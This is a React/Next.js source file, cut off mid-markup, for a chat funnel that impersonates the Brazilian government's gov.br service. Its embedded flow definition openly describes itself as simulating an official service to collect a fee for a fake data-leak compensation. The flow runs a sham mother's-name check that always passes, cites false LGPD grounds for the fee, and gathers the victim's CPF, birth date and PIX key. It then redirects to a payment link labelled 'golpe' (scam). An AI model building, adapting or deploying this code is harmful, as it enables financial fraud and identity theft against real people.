
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

// Interface for initial parameters passed to the chat flow
export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
  typebotId?: string;
  apiHost?: string;
}

// Interfaces for flow step data types
interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrlTemplate?: string;
  style?: string;
}

interface FlowStepDataVideo {
  title?: string;
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string; // For button styling hints
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayImage {
    message: string;
    imageGenerationDetails?: {
        functionToCall: string;
        templateName: string;
        inputs: Record<string, string>;
        outputVariable: string;
    };
    fallbackImageUrl: string;
    imageAiHint?: string;
    imageAltText?: string;
}

// Main flow step interface
interface FlowStep {
  type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage';
  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage;
  nextStep?: string;
  nextAction?: 'play_video_then_proceed';
  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
  isTerminal?: boolean;
}

// Interface for chat messages
interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

const funnelDefinition = {
  "funnelName": "GovBR Indenização Scan Funnel",
  "description": "Funil para simular um serviço oficial do gov.br e coletar uma taxa de saque para uma suposta indenização por vazamento de dados.",
  "identity": {
    "visualTheme": "gov.br (usar paleta de cores, fontes e logo oficiais)",
    "botName": "Atendimento Gov.BR"
  },
  "variables": {
    "userName": { "description": "Nome completo do usuário." },
    "userCPF": { "description": "CPF do usuário." },
    "userBirthDate": { "description": "Data de nascimento do usuário." },
    "motherName": { "description": "Nome da mãe do usuário (usado para falsa verificação)." },
    "chavePix": { "description": "A chave PIX informada pelo usuário.", "value": null },
    "indenizacaoValor": { "description": "Valor da indenização.", "value": "R$ 5.960,50" },
    "taxaValor": { "description": "Valor da taxa de saque.", "value": "R$ 61,90" },
    "dataAtual": { "description": "A data do dia.", "source": "system_current_date_dd_mm_yyyy" },
    "generatedReceiptImageUrl": { "description": "URL da imagem do comprovante gerado.", "value": null }
  },
  "initialStep": "step1_video_hook",
  "steps": {
    "step1_video_hook": {
      "type": "videoDisplay" as const,
      "data": {
        "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro, assista ao vídeo abaixo para informações importantes e para iniciarmos seu atendimento. 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextAction": "play_video_then_proceed" as const,
      "nextStep": "step1b_intro_message1"
    },
    "step1b_intro_message1": {
      "type": "displayMessage" as const,
      "data": {
          "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
      },
      "nextStep": "step1c_intro_message2"
    },
    "step1c_intro_message2": {
      "type": "displayMessage" as const,
      "data": {
          "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
      },
      "nextStep": "step2_mother_name_check"
    },
    "step2_mother_name_check": {
      "type": "multipleChoice" as const,
      "data": {
        "message": "Por favor, confirme o nome completo de sua mãe:",
        "options": [
          {"text": "MARIA APARECIDA DA SILVA", "nextStep": "step3_validation_loading"},
          {"text": "ANA BEATRIZ PEREIRA SANTOS", "nextStep": "step3_validation_loading"},
          {"text": "{{motherName}}", "nextStep": "step3_validation_loading"},
          {"text": "RITA DE CÁSSIA OLIVEIRA", "nextStep": "step3_validation_loading"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_validation_loading"}
        ],
        "note": "Independentemente da escolha, o fluxo avança. O objetivo é simular segurança."
      }
    },
    "step3_validation_loading": {
      "type": "loadingScreen" as const,
      "data": {
        "message": "Validando suas respostas e cruzando informações com a base de dados oficial... Por favor, aguarde.",
        "duration_ms": 3500
      },
      "nextStep": "step3b_confirmation_message"
    },
    "step3b_confirmation_message": {
      "type": "displayMessage" as const,
      "data": {
        "title": "✅ Autenticidade Confirmada!",
        "icon": "success_checkmark_gov_style" as const,
        "message": "Seus dados foram validados com sucesso em nosso sistema.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Valor da Indenização Pré-Aprovada": "{{indenizacaoValor}}",
          "Status da Solicitação": "Pré-Aprovado",
          "Data da Consulta": "{{dataAtual}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step4_collect_pix_type"
    },
    "step4_collect_pix_type": {
      "type": "multipleChoice" as const,
      "data": {
        "message": "Excelente, {{userName}}! Para qual tipo de chave PIX você gostaria de direcionar o valor de {{indenizacaoValor}}?",
        "options": [
          {"text": "CPF (Recomendado e mais rápido)", "action": "setChavePixToUserCPF" as const, "nextStep": "step4d_confirm_pix_key"},
          {"text": "Telefone", "nextStep": "step4b_collect_pix_input_telefone"},
          {"text": "E-mail", "nextStep": "step4c_collect_pix_input_email"},
          {"text": "Chave Aleatória", "nextStep": "step4e_collect_pix_input_aleatoria"}
        ]
      },
      "internalActions": {
        "setChavePixToUserCPF": { "type": "setVariable", "variableName": "chavePix", "valueFrom": "userCPF" }
      }
    },
    "step4b_collect_pix_input_telefone": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:",
        "placeholder": "(XX) XXXXX-XXXX",
        "variableToSet": "chavePix",
        "validation": "br_phone" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4c_collect_pix_input_email": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (E-mail):",
        "placeholder": "seuemail@provedor.com",
        "variableToSet": "chavePix",
        "validation": "email" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4e_collect_pix_input_aleatoria": {
      "type": "textInput" as const,
      "data": {
        "message": "Por favor, digite sua chave PIX (Aleatória):",
        "placeholder": "Sua chave aleatória",
        "variableToSet": "chavePix",
        "validation": "alphanumeric_with_hyphens" as const
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4d_confirm_pix_key": {
        "type": "multipleChoice" as const,
        "data": {
            "message": "⚠️ **ATENÇÃO!** Verifique cuidadosamente se a chave PIX está correta antes de prosseguir.\n\nChave PIX informada: **{{chavePix}}**\n\nO Governo Federal não se responsabiliza por transferências para chaves PIX informadas incorretamente.",
            "options": [
                {"text": "Sim, a chave PIX está correta.", "nextStep": "step5_generate_receipt_loading"},
                {"text": "Não, desejo corrigir a chave.", "nextStep": "step4_collect_pix_type"}
            ]
        }
    },
    "step5_generate_receipt_loading": {
      "type": "loadingScreen" as const,
      "data": {
        "message": "Registrando sua chave PIX e gerando seu comprovante oficial de recebimento dos valores... Isso pode levar alguns instantes.",
        "duration_ms": 4000
      },
      "nextStep": "step5b_display_receipt"
    },
    "step5b_display_receipt": {
      "type": "displayImage" as const,
      "data": {
        "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso e sua chave PIX **{{chavePix}}** está registrada para o recebimento de **{{indenizacaoValor}}**.",
        "imageGenerationDetails": {
            "functionToCall": "generateReceiptImage",
            "templateName": "comprovante_template.png",
            "inputs": { "userName": "{{userName}}", "userCPF": "{{userCPF}}", "userBirthDate": "{{userBirthDate}}", "motherName": "{{motherName}}", "chavePix": "{{chavePix}}", "indenizacaoValor": "{{indenizacaoValor}}", "taxaValor": "{{taxaValor}}", "dataAtual": "{{dataAtual}}" },
            "outputVariable": "generatedReceiptImageUrl"
        },
        "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização",
        "imageAiHint": "official government receipt document",
        "imageAltText": "Comprovante de Indenização Gov.BR"
      },
      "nextStep": "step6_reveal_tax"
    },
    "step6_reveal_tax": {
      "type": "displayMessage" as const,
      "data": {
        "title": "RESUMO PARA LIBERAÇÃO IMEDIATA",
        "icon": "currency_dollar_gov_style" as const,
        "details": {
          "Indenização Total Disponível para Saque": "{{indenizacaoValor}}",
          "Titular da Indenização": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX Registrada para Recebimento": "{{chavePix}}",
          "Data da Solicitação": "{{dataAtual}}",
          "--------------------------------------": "--------------------------------------",
          "Taxa Única Transacional (Imposto de Saque Federal)": "**{{taxaValor}}**"
        },
        "note": "Esta taxa é referente aos custos operacionais e de segurança para a transferência eletrônica via PIX.",
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step7_justify_tax_cta"
    },
    "step7_justify_tax_cta": {
      "type": "multipleChoice" as const,
      "data": {
        "message": "Prezado(a) {{userName}},\n\nSeu saldo de **{{indenizacaoValor}}** está pronto para ser transferido para a chave PIX **{{chavePix}}**.\n\nPara liberar o saque IMEDIATAMENTE, é necessário o pagamento da Taxa Única Transacional de **{{taxaValor}}**.\n\nConforme a Lei Geral de Proteção de Dados (LGPD, Lei n.º 13.709/2018), esta taxa não pode ser descontada diretamente do valor da indenização, pois o montante está vinculado e protegido em seu nome. O pagamento da taxa garante a segurança e a correta destinação dos fundos exclusivamente a você.",
        "options": [
          {
            "text": "✅ Sim! Quero pagar a taxa de {{taxaValor}} e receber meus {{indenizacaoValor}} AGORA!",
            "action": "redirectToPayment" as const,
            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}",
            "style": "primary_cta_button_gov_style"
          },
          {
            "text": "Tenho dúvidas sobre a taxa.",
            "nextStep": "step7b_explain_tax_more",
            "style": "secondary_link_button_gov_style"
          }
        ]
      }
    },
    "step7b_explain_tax_more": {
        "type": "multipleChoice" as const,
        "data": {
            "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
            "options": [
                 {
                    "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
                    "action": "redirectToPayment" as const,
                    "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}",
                    "style": "primary_cta_button_gov_style"
                  },
                  {
                    "text": "Não quero pagar a taxa agora.",
                    "nextStep": "step_end_no_payment",
                    "style": "destructive_link_button_gov_style"
                  }
            ]
        }
    },
    "step10_pix_registered": {
        "type": "displayMessage" as const,
        "data": {
          "title": "Chave PIX Cadastrada",
          "icon": "success_checkmark_gov_style" as const,
          "message": "Sua chave pix foi cadastrada com sucesso!",
          "details": {
            "Nome": "{{userName}}",
            "Chave Pix": "{{chavePix}}",
            "Status": "Aprovado"
          },
          "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
        },
        "nextStep": "step11_ask_generate_receipt"
    },
    "step_end_no_payment": {
        "type": "displayMessage" as const,
        "data": {
            "title": "Solicitação Pendente",
            "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
            "icon": "warning_amber_gov_style" as const
        },
        "isTerminal": true
    }
  }
};


const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const router = useRouter();

  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
  const videoPlaceholderData = useRef<{title?: string; message?: string; thumbnailText?: string; videoUrl?: string} | null>(null);


  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const [flowVariables, setFlowVariables] = useState<Record<string, any>>({
    indenizacaoValor: funnelDefinition.variables.indenizacaoValor.value,
    taxaValor: funnelDefinition.variables.taxaValor.value,
    chavePix: null,
    dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
    generatedReceiptImageUrl: null
  });

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);

  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...initialParams,
        ...flowVariables,
        userName: initialParams.nome || flowVariables.userName || 'Usuário',
        userCPF: initialParams.cpf || flowVariables.userCPF || '---.---.---.--',
        userBirthDate: initialParams.nascimento || flowVariables.userBirthDate || '--/--/----',
        motherName: initialParams.mae || flowVariables.motherName || 'Nome da Mãe Indisponível',
    };

    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
        let valueToInsert = String(allVars[key as keyof typeof allVars]);

        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
            // Already formatted
        }
        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
            // Already formatted
        }

        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoPlaceholderData.current, isTextInputActive]);


  useEffect(() => {
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);

      const nextStepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
      if (nextStepConfig?.type !== 'videoDisplay') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
      }
    }

    setIsBotTyping(true);

    const processStep = async () => {
      const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
      if (!stepConfig) {
        console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
        if(isNewStep) setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
        setIsBotTyping(false);
        return;
      }

      const botMessageId = `bot-${Date.now()}`;
      let nextStepTransitionDelay = 1200;

      switch (stepConfig.type) {
        case 'videoDisplay': {
          const data = stepConfig.data as FlowStepDataVideo;
          if (isNewStep) {
            videoPlaceholderData.current = { title: data.title, message: data.message, thumbnailText: data.thumbnailText, videoUrl: data.videoUrl };
            setCurrentVideoMessage(formatText(data.title || data.message));
            setShowVideoThumbnailOverlay(true);
          }
          setIsBotTyping(false);
          return;
        }
        case 'multipleChoice': {
          const data = stepConfig.data as FlowStepDataMultipleChoice;
          const formattedOptions = data.options.map(opt => ({
            ...opt,
            text: formatText(opt.text)
          }));
          if (isNewStep) {
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
          }
          break;
        }
        case 'loadingScreen': {
          const data = stepConfig.data as FlowStepDataLoading;
          if(isNewStep) {
            setLoadingMessage(formatText(data.message));
            setIsLoadingStep(true);
          }
          setIsBotTyping(false);
          autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) {
                setIsLoadingStep(false);
                setLoadingMessage(null);
                if (stepConfig.nextStep) {
                  setCurrentStepKey(stepConfig.nextStep);
                }
            }
          }, data.duration_ms);
          return;
        }
        case 'displayMessage': {
          const data = stepConfig.data as FlowStepDataDisplayMessage;
          const displayMsgData: Message = {
            id: botMessageId,
            sender: 'bot',
            displayTitle: formatText(data.title),
            text: data.message ? formatText(data.message) : undefined,
            displayDetails: formatDetailsObject(data.details),
            displayIcon: data.icon,
          };
          if (isNewStep) setCurrentDisplayMessage(displayMsgData);

          if (data.audioUrl && audioRef.current && isNewStep) {
            audioRef.current.src = data.audioUrl;
            audioRef.current.play().catch(e => console.warn("Audio autoplay failed for step " + currentStepKey + ":", e));
          }
          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200);
          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity;
          break;
        }
        case 'textInput': {
            const data = stepConfig.data as FlowStepDataTextInput;
            if (isNewStep) {
                 setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
            }
            setCurrentTextInputConfig(data);
            setIsTextInputActive(true);
            setTextInputValue("");
            setIsBotTyping(false);
            return;
        }
        case 'displayImage': {
          const data = stepConfig.data as FlowStepDataDisplayImage;
          if (isNewStep) {
             setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
          }

           if (data.imageGenerationDetails && isNewStep) {
                setLoadingMessage(formatText("Gerando seu comprovante..."));
                setIsLoadingStep(true);
                setIsBotTyping(false);

                autoTransitionTimerRef.current = setTimeout(() => {
                  if (prevCurrentStepKeyRef.current === currentStepKey) {
                    setIsLoadingStep(false);
                    setLoadingMessage(null);
                    setFlowVariables(prev => ({...prev, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                    setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", message: undefined, aiHint: data.imageAiHint || 'document image'});

                    if (stepConfig.nextStep) {
                        autoTransitionTimerRef.current = setTimeout(() => {
                             if (prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
                        }, 4000);
                    }
                  }
                }, 2000);
                return;
           } else {
             if(isNewStep) setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante Gerado", message: undefined, aiHint: data.imageAiHint || 'document image'});
             nextStepTransitionDelay = 4000;
           }
          break;
        }
        default:
          console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
          if (isNewStep) setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
      }

      setIsBotTyping(false);

      const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                stepConfig.type !== 'multipleChoice' &&
                                stepConfig.type !== 'videoDisplay' &&
                                stepConfig.type !== 'loadingScreen' &&
                                stepConfig.type !== 'textInput' &&
                                !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails);

      if (canAutoTransition && isNewStep) {
            autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) {
               setCurrentStepKey(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelay);
      }
    };

    const appearanceDelay = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type === 'loadingScreen' || (isNewStep && currentStepKey === funnelDefinition.initialStep) ) ? 0 : 700;

    if (isNewStep || funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type === 'loadingScreen') {
        setTimeout(processStep, appearanceDelay);
    } else {
        setIsBotTyping(false);
    }

    return () => {
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  }, [currentStepKey, initialParams]);

  const handleOptionClick = (option: ChatOption) => {
    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);

    const currentStepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];

    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = initialParams.cpf || flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
        const actionDetail = currentStepConfig.internalActions[option.action];
        if (actionDetail.type === 'setVariable') {
            let valueFromSource = actionDetail.valueFrom;
            let valueToSet = "";
            if (valueFromSource === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF || "";
            else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource as keyof SimulatedChatParams] || "";

            setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
        }
    }

    if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
        let finalPaymentUrl = formatText(option.paymentUrlTemplate);

        const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
        const taxaValorNum = parseFloat(taxaValorCleaned);
        finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));

        const userNameEncoded = encodeURIComponent(initialParams.nome || flowVariables.userName || "");
        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", userNameEncoded);

        const userCPFNumbersOnly = (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, '');
        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);

        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value);
                }
            });
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento. Verifique o link." }]);
        }
        return;
    }

    if (option.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
      setCurrentStepKey(option.nextStep);
    } else if (!option.action) {
        console.warn("Option clicked with no nextStep and no action:", option);
    }
  };

  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (stepConfig?.type !== 'videoDisplay') return;

    setShowVideoThumbnailOverlay(false);

    if ((stepConfig as FlowStep).nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = setTimeout(() => {
        if(prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
      }, 500);
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        setMessages(prev => [...prev, {id: `err-input-${Date.now()}`, sender: 'bot', text: "Por favor, preencha o campo."}]);
        return;
    }

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);

    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }

    setIsTextInputActive(false);
    setTextInputValue("");
    const nextStep = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.nextStep;
    if (nextStep) {
        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
        setCurrentStepKey(nextStep);
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>;
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {videoPlaceholderData.current && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding: '10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer'
            }}
          >
            {showVideoThumbnailOverlay && (
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {videoPlaceholderData.current?.thumbnailText || "Clique para Ouvir"}
                </span>
              </div>
            )}
             <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', color: '#777'}}>
                { !showVideoThumbnailOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
             </div>
          </div>
        </div>
      )}


      {isLoadingStep && loadingMessage && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && !isLoadingStep && (
        <div className="image-step-container" style={{ padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentImageDetails.message && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding:'10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
